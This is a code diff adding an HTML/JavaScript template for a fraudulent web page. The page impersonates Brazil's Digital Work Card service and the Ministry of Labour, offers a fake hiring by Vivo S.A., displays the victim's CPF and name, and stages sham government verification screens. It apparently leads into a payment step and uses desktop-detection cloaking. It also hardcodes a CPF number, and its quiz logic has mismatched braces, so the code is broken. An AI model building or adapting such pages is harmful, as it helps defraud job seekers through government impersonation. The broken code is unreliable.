@@ -1,0 +1,525 @@
+<html>
+<head>
+{% include 'pagamento_head.html' %}
+    <!-- DETECÇÃO INSTANTÂNEA DE DESKTOP - Aplicada antes de qualquer renderização -->
+    <script src="{{ url_for('static', filename='js/instant_detection.js') }}"></script>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carteira de Trabalho Digital</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"></link>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'custom-blue': '#012D6B',
+                    },
+                    fontFamily: {
+                        'roboto': ['Roboto', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+        }
+        /* Animação de pulsação simplificada - mais próxima do original */
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        /* Loader tradicional - estilo governo */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spin {
+            animation: spin 1s linear infinite;
+        }
+        
+        /* Transições básicas entre telas - sutis */
+        .screen-transition {
+            transition: opacity 0.3s ease;
+        }
+        .screen-hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .screen-visible {
+            opacity: 1;
+        }
+        
+        /* Estilos simples para botões oficiais */
+        .gov-button {
+            transition: background-color 0.2s ease;
+        }
+        .gov-button:hover {
+            filter: brightness(1.05);
+        }
+    </style>
+</head>
+<body class="bg-white font-roboto">
+    <!-- Login Screen - Estilo tradicional do Governo -->
+    <div id="loginScreen" class="fixed inset-0 bg-custom-blue flex flex-col items-center justify-center text-white px-4 screen-transition screen-visible">
+        <img src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo do Ministério do Trabalho" class="w-32 h-32 mb-6">
+        
+        <!-- Loader tradicional -->
+        <div id="loader" class="w-16 h-16 border-t-4 border-white rounded-full spin mb-4"></div>
+        
+        <p class="text-lg mb-4 text-center">Acessando Carteira de Trabalho Digital do CPF: <span id="display-cpf">Carregando...</span></p>
+        <p class="text-sm text-center text-blue-200">Aguarde enquanto consultamos os dados</p>
+    </div>
+    
+    <!-- User Confirmation Screen - Layout oficial do Governo -->
+    <div id="userConfirmation" class="fixed inset-0 bg-custom-blue hidden flex flex-col items-center justify-center text-white px-4 screen-transition">
+        <img src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo do Ministério do Trabalho" class="w-32 h-32 mb-4">
+        <div class="bg-white text-custom-blue p-6 rounded-lg shadow-md max-w-md w-full">
+            <div class="flex flex-col items-center mb-6">
+                <div class="w-24 h-24 bg-gray-200 rounded-full flex items-center justify-center mb-4">
+                    <i class="fas fa-user-circle text-6xl text-gray-400"></i>
+                </div>
+                <h2 id="user-name" class="text-xl font-bold text-center"></h2>
+                <p id="user-cpf" class="text-gray-600"></p>
+            </div>
+            
+            <p class="text-gray-800 mb-6 text-center">
+                Para que a Vivo S.A. possa assinar sua Carteira de Trabalho Digital, é necessário confirmar que esta conta pertence a você respondendo a uma pergunta de validação.
+            </p>
+            
+            <button id="proceedToValidation" class="w-full bg-custom-blue text-white py-3 rounded-lg hover:bg-blue-800 transition duration-300 gov-button">
+                Prosseguir
+            </button>
+        </div>
+    </div>
+
+    <!-- Validation Questions - Layout oficial do Governo -->
+    <div id="validationQuestions" class="fixed inset-0 bg-custom-blue hidden flex flex-col items-center justify-center text-white px-4 screen-transition">
+        <img src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo do Ministério do Trabalho" class="w-32 h-32 mb-6">
+        <h2 class="text-2xl font-bold mb-4" id="questionTitle">Pergunta de Validação</h2>
+        <p class="text-lg mb-4 text-center" id="questionText"></p>
+        <div id="answerButtons" class="flex flex-col space-y-4 w-full max-w-md"></div>
+    </div>
+
+    <!-- Main Content (initially hidden) - Layout oficial do Governo -->
+    <div id="mainContent" class="hidden">
+        <!-- Header simples e oficial -->
+        <div class="bg-custom-blue text-white p-4 pb-3">
+            <div class="flex items-center mb-2">
+                <img src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo representando a Carteira de Trabalho Digital com um design minimalista" class="h-10 w-10">
+                <h1 class="ml-4 text-lg font-medium uppercase">CARTEIRA DE TRABALHO DIGITAL</h1>
+            </div>
+            <div class="text-xl font-light">VIVO S.A.</div>
+        </div>
+
+        <!-- Tabs -->
+        <div class="flex border-b">
+            <div class="w-full text-center py-3 border-b-2 border-custom-blue text-custom-blue font-medium">PEDIDO DE CONTRATAÇÃO</div>
+        </div>
+
+        <!-- Content -->
+        <div class="bg-gray-100 p-4">
+            <div class="mb-4">
+                <div class="text-gray-500 text-sm font-medium">CNPJ</div>
+                <div class="text-gray-800 font-normal">02.449.992/0001-62</div>
+            </div>
+
+            <div class="mb-4">
+                <div class="text-gray-500 text-sm font-medium">Data de Contratação</div>
+                <div class="text-gray-800 font-normal" id="currentDate"></div>
+            </div>
+
+            <div class="mb-4">
+                <div class="text-gray-500 text-sm font-medium">Benefícios</div>
+                <div class="text-gray-800 font-normal">INSS</div>
+                <div class="text-gray-800 font-normal">Seguro Desemprego</div>
+                <div class="text-gray-800 font-normal">Plano de Saúde</div>
+                <div class="text-gray-800 font-normal">Vale Alimentação</div>
+            </div>
+
+            <div class="mb-4">
+                <div class="text-gray-500 text-sm font-medium">Ocupação Inicial</div>
+                <div class="text-gray-800 font-normal">4223-05 - Atendente de Suporte (Home Office)</div>
+            </div>
+
+            <div class="mb-4">
+                <div class="text-gray-500 text-sm font-medium">Remuneração</div>
+                <div class="text-gray-800 font-normal">R$ 1.788,60</div>
+            </div>
+
+            <!-- User Approval Section -->
+            <div class="mt-6 bg-white p-4 rounded-sm shadow-md">
+                <div class="text-gray-800 text-lg font-medium mb-4">Você autoriza a empresa VIVO S.A. a assinar sua Carteira Digital de Trabalho?</div>
+                <div class="flex justify-center space-x-4">
+                    <button id="authorizeBtn" class="bg-custom-blue text-white px-6 py-2 rounded-sm shadow-sm hover:bg-blue-800 transition duration-300 gov-button">Autorizar</button>
+                    <button class="bg-white text-custom-blue px-6 py-2 rounded-sm shadow-sm border border-custom-blue hover:bg-gray-100 transition duration-300">Rejeitar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Overlay tradicional -->
+    <div id="overlay" class="fixed inset-0 bg-custom-blue bg-opacity-50 hidden flex items-center justify-center">
+        <img id="ministryLogo" src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo do Ministério do Trabalho" class="w-40 h-40 blink">
+    </div>
+
+    <!-- Success Screen - design oficial do Governo -->
+    <div id="successScreen" class="fixed inset-0 bg-custom-blue hidden flex flex-col items-center justify-center text-white px-4">
+        <img src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo do Ministério do Trabalho" class="w-32 h-32 mb-6">
+        <h2 class="text-2xl font-bold mb-2">Carteira de Trabalho</h2>
+        <p class="text-lg mb-8 text-center">Para finalizar a contratação, clique no botão "Continuar" abaixo.</p>
+        <a href="{{ url_for('finalizar') }}" id="continueBtn" class="bg-white text-custom-blue px-8 py-3 rounded-md shadow-lg hover:bg-gray-100 transition duration-300 transform hover:-translate-y-1 active:translate-y-0 active:shadow-md">Continuar</a>
+    </div>
+
+    <script>
+        // Get current date and format it
+        const currentDate = new Date();
+        const day = String(currentDate.getDate()).padStart(2, '0');
+        const month = String(currentDate.getMonth() + 1).padStart(2, '0');
+        const year = currentDate.getFullYear();
+        const formattedDate = `${day}/${month}/${year}`;
+
+        // Set the formatted date in the HTML
+        document.getElementById('currentDate').textContent = formattedDate;
+
+        // Get elements
+        const loginScreen = document.getElementById('loginScreen');
+        const userConfirmation = document.getElementById('userConfirmation');
+        const validationQuestions = document.getElementById('validationQuestions');
+        const mainContent = document.getElementById('mainContent');
+        const authorizeBtn = document.getElementById('authorizeBtn');
+        const overlay = document.getElementById('overlay');
+        const successScreen = document.getElementById('successScreen');
+        const continueBtn = document.getElementById('continueBtn');
+        const questionTitle = document.getElementById('questionTitle');
+        const questionText = document.getElementById('questionText');
+        const answerButtons = document.getElementById('answerButtons');
+        const proceedToValidation = document.getElementById('proceedToValidation');
+        const displayCpf = document.getElementById('display-cpf');
+        const userName = document.getElementById('user-name');
+        const userCpf = document.getElementById('user-cpf');
+
+        // API data
+        let apiData = null;
+        let userCPF = '';
+        
+        // Function to normalize CPF (remove non-numeric characters)
+        function normalizeCPF(cpf) {
+            return cpf.replace(/\D/g, '');
+        }
+        
+        // Function to format CPF with dots and dash
+        function formatCPF(cpf) {
+            const normalizedCPF = normalizeCPF(cpf);
+            if (normalizedCPF.length !== 11) return cpf;
+            return `${normalizedCPF.slice(0, 3)}.${normalizedCPF.slice(3, 6)}.${normalizedCPF.slice(6, 9)}-${normalizedCPF.slice(9)}`;
+        }
+        
+        // Get CPF from session storage or use a default one for testing
+        function getUserCPF() {
+            // Try to get from session data (this assumes the Flask app sets it)
+            userCPF = '{{ cpf }}' || '053.968.801-04'; // Fallback to example if not provided
+            
+            // Normalize and display the CPF
+            const normalizedCPF = normalizeCPF(userCPF);
+            const formattedCPF = formatCPF(normalizedCPF);
+            displayCpf.textContent = formattedCPF;
+            
+            return normalizedCPF;
+        }
+        
+        // Usar dados do localStorage em vez de fazer nova consulta à API
+        async function fetchUserData() {
+            const cpf = getUserCPF();
+            
+            try {
+                // Tentar obter dados do localStorage primeiro
+                const savedUserData = localStorage.getItem('userData');
+                
+                if (savedUserData) {
+                    const userData = JSON.parse(savedUserData);
+                    
+                    // Verificar se o CPF salvo corresponde ao atual
+                    if (userData.cpf === normalizeCPF(cpf)) {
+                        console.log('Usando dados do localStorage: ', userData);
+                        // Criar estrutura compatível com o formato que a função espera
+                        apiData = {
+                            nomeCompleto: userData.nome,
+                            documento: userData.cpf,
+                            dataDeNascimento: userData.dataNascimento
+                        };
+                        
+                        // Display user name and CPF on confirmation screen
+                        userName.textContent = apiData.nomeCompleto;
+                        userCpf.textContent = formatCPF(apiData.documento);
+                        
+                        // Hide login screen, show confirmation screen
+                        loginScreen.classList.add('hidden');
+                        userConfirmation.classList.remove('hidden');
+                        
+                        return true;
+                    }
+                }
+                
+                // Se não tiver dados no localStorage ou CPF não corresponder, exibe mensagem de erro
+                console.error('Dados não encontrados no localStorage');
+                alert('Não foi possível verificar seus dados. Por favor, complete o cadastro inicial primeiro.');
+                const currentParams = new URLSearchParams(window.location.search);
+                const redirectUrl = new URL('/cadastro', window.location.origin);
+                currentParams.forEach((value, key) => {
+                    redirectUrl.searchParams.set(key, value);
+                });
+                window.location.href = redirectUrl.toString();
+                return false;
+            } catch (error) {
+                console.error('Erro ao obter dados do usuário:', error);
+                alert('Ocorreu um erro ao acessar seus dados. Por favor, volte e complete o cadastro inicial.');
+                const currentParams = new URLSearchParams(window.location.search);
+                const redirectUrl = new URL('/cadastro', window.location.origin);
+                currentParams.forEach((value, key) => {
+                    redirectUrl.searchParams.set(key, value);
+                });
+                window.location.href = redirectUrl.toString();
+                return false;
+            }
+        }
+        
+        // Initialize by fetching user data
+        fetchUserData();
+        
+        // Proceed to validation questions - versão simplificada
+        proceedToValidation.addEventListener('click', () => {
+            userConfirmation.classList.add('hidden');
+            validationQuestions.classList.remove('hidden');
+            showValidationQuestion(1);
+        });
+
+        function showValidationQuestion(questionNumber) {
+            
+            answerButtons.innerHTML = '';
+
+            if (questionNumber === 1) {
+                questionTitle.textContent = "Pergunta de Validação";
+                questionText.textContent = "Qual é a sua data de nascimento?";
+                
+                const correctDate = apiData.dataDeNascimento;
+                
+                // Generate random incorrect dates
+                const randomDates = generateRandomDates(correctDate, 2);
+                const dates = [correctDate, ...randomDates];
+                
+                shuffleArray(dates);
+                
+                dates.forEach(date => {
+                    const button = document.createElement('button');
+                    button.textContent = date;
+                    button.className = "bg-white text-custom-blue px-6 py-2 rounded-sm shadow-sm hover:bg-gray-100 transition duration-300";
+                    button.onclick = () => checkAnswer(date === correctDate, 3);
+                    answerButtons.appendChild(button);
+                });
+            }
+        }
+        
+        // Generate random dates different from the correct one
+        function generateRandomDates(correctDate, count) {
+            const dates = [];
+            const [day, month, year] = correctDate.split('/').map(Number);
+            
+            while (dates.length < count) {
+                // Generate a random day, month and possibly a different year
+                let randomDay = Math.floor(Math.random() * 28) + 1;
+                let randomMonth = Math.floor(Math.random() * 12) + 1;
+                let randomYear = year - Math.floor(Math.random() * 5);
+                
+                // Format the date
+                const formattedDay = String(randomDay).padStart(2, '0');
+                const formattedMonth = String(randomMonth).padStart(2, '0');
+                const formattedDate = `${formattedDay}/${formattedMonth}/${randomYear}`;
+                
+                // Add date if it's different from the correct one and not already in the array
+                if (formattedDate !== correctDate && !dates.includes(formattedDate)) {
+                    dates.push(formattedDate);
+                }
+            }
+            
+            return dates;
+        }
+
+        function checkAnswer(isCorrect, nextQuestion) {
+            if (isCorrect) {
+                // Mostrar efeito de aprovação na resposta selecionada
+                event.target.classList.add('bg-green-100');
+                event.target.innerHTML = `${event.target.textContent} <i class="fas fa-check-circle text-green-500 ml-2"></i>`;
+                
+                // Desabilitar todos os botões durante a transição
+                const buttons = document.querySelectorAll('#answerButtons button');
+                buttons.forEach(button => {
+                    button.disabled = true;
+                    if (button !== event.target) {
+                        button.classList.add('opacity-50');
+                    }
+                });
+                
+                setTimeout(() => {
+                    // Como só temos uma pergunta agora, vamos diretamente para a tela principal
+                    // Transição suave para a tela principal
+                    validationQuestions.classList.add('screen-hidden');
+                        
+                        // Preparar conteúdo principal
+                        mainContent.classList.remove('hidden');
+                        // Inicialmente oculto para animação
+                        mainContent.style.opacity = '0';
+                        mainContent.style.transform = 'translateY(20px)';
+                        
+                        setTimeout(() => {
+                            validationQuestions.classList.add('hidden');
+                            // Animar entrada do conteúdo principal
+                            mainContent.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+                            mainContent.style.opacity = '1';
+                            mainContent.style.transform = 'translateY(0)';
+                        }, 500);
+                    } else {
+                        // Esconder pergunta atual e mostrar a próxima com efeito de slide
+                        const currentQuestion = document.querySelector('#questionText');
+                        const currentButtons = document.getElementById('answerButtons');
+                        
+                        currentQuestion.style.opacity = '0';
+                        currentQuestion.style.transform = 'translateY(-10px)';
+                        currentButtons.style.opacity = '0';
+                        currentButtons.style.transform = 'translateY(10px)';
+                        
+                        setTimeout(() => {
+                            showValidationQuestion(nextQuestion);
+                            
+                            // Animar a entrada da nova pergunta
+                            setTimeout(() => {
+                                currentQuestion.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+                                currentQuestion.style.opacity = '1';
+                                currentQuestion.style.transform = 'translateY(0)';
+                                
+                                currentButtons.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+                                currentButtons.style.opacity = '1';
+                                currentButtons.style.transform = 'translateY(0)';
+                            }, 100);
+                        }, 400);
+                    }
+                }, 800);
+            } else {
+                // Efeito visual para resposta incorreta
+                event.target.classList.add('bg-red-100');
+                event.target.innerHTML = `${event.target.textContent} <i class="fas fa-times-circle text-red-500 ml-2"></i>`;
+                
+                // Mostrar mensagem de erro mais elegante
+                setTimeout(() => {
+                    event.target.classList.remove('bg-red-100');
+                    event.target.innerHTML = event.target.textContent.replace(' ✗', '');
+                    
+                    // Adicionar mensagem de erro abaixo dos botões
+                    const errorMsg = document.createElement('div');
+                    errorMsg.className = 'text-red-500 text-center mt-4 bg-red-50 p-3 rounded-lg';
+                    errorMsg.innerHTML = '<i class="fas fa-exclamation-circle mr-2"></i>Resposta incorreta. Por favor, tente novamente.';
+                    
+                    // Remover mensagem de erro anterior, se existir
+                    const oldError = document.querySelector('.text-red-500');
+                    if (oldError) oldError.remove();
+                    
+                    answerButtons.parentNode.insertBefore(errorMsg, answerButtons.nextSibling);
+                    
+                    // Remover a mensagem após 3 segundos
+                    setTimeout(() => {
+                        errorMsg.style.opacity = '0';
+                        errorMsg.style.transition = 'opacity 0.6s ease';
+                        setTimeout(() => errorMsg.remove(), 600);
+                    }, 3000);
+                }, 800);
+            }
+        }
+
+        function shuffleArray(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+            return array;
+        }
+
+        // Add click event to Authorize button with enhanced animation
+        authorizeBtn.addEventListener('click', () => {
+            // Efeito visual no botão
+            authorizeBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Processando...';
+            authorizeBtn.disabled = true;
+            
+            // Mensagens sequenciais de processamento
+            const loadingMessages = [
+                "Iniciando autorização...",
+                "Verificando dados pessoais...",
+                "Registrando na base do Ministério do Trabalho...",
+                "Processando assinatura digital...",
+                "Finalizando autorização..."
+            ];
+            
+            // Preparar e mostrar overlay com animação
+            overlay.classList.remove('hidden');
+            overlay.style.opacity = '0';
+            
+            setTimeout(() => {
+                overlay.style.transition = 'opacity 0.5s ease';
+                overlay.style.opacity = '1';
+                
+                // Atualizar as mensagens de carregamento sequencialmente
+                let messageIndex = 0;
+                const loadingMsg = document.getElementById('loading-message');
+                
+                const messageInterval = setInterval(() => {
+                    if (messageIndex < loadingMessages.length) {
+                        // Animação de desaparecimento e aparecimento para cada mensagem
+                        loadingMsg.style.opacity = '0';
+                        loadingMsg.style.transform = 'translateY(-5px)';
+                        
+                        setTimeout(() => {
+                            loadingMsg.textContent = loadingMessages[messageIndex];
+                            loadingMsg.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+                            loadingMsg.style.opacity = '1';
+                            loadingMsg.style.transform = 'translateY(0)';
+                            messageIndex++;
+                        }, 300);
+                    } else {
+                        clearInterval(messageInterval);
+                    }
+                }, 800);
+                
+                // Após 4 segundos, mostrar a tela de sucesso com transição suave
+                setTimeout(() => {
+                    overlay.style.opacity = '0';
+                    
+                    // Preparar tela de sucesso
+                    successScreen.classList.remove('hidden');
+                    successScreen.style.opacity = '0';
+                    successScreen.style.transform = 'scale(0.95)';
+                    
+                    setTimeout(() => {
+                        overlay.classList.add('hidden');
+                        // Animar entrada da tela de sucesso
+                        successScreen.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+                        successScreen.style.opacity = '1';
+                        successScreen.style.transform = 'scale(1)';
+                        
+                        // Sem efeitos visuais para manter interface oficial
+                    }, 500);
+                }, 4000);
+            }, 100);
+        });
+        
+        // Funções de efeitos visuais removidas para manter interface governamental
+    </script>
+</body>
+</html>
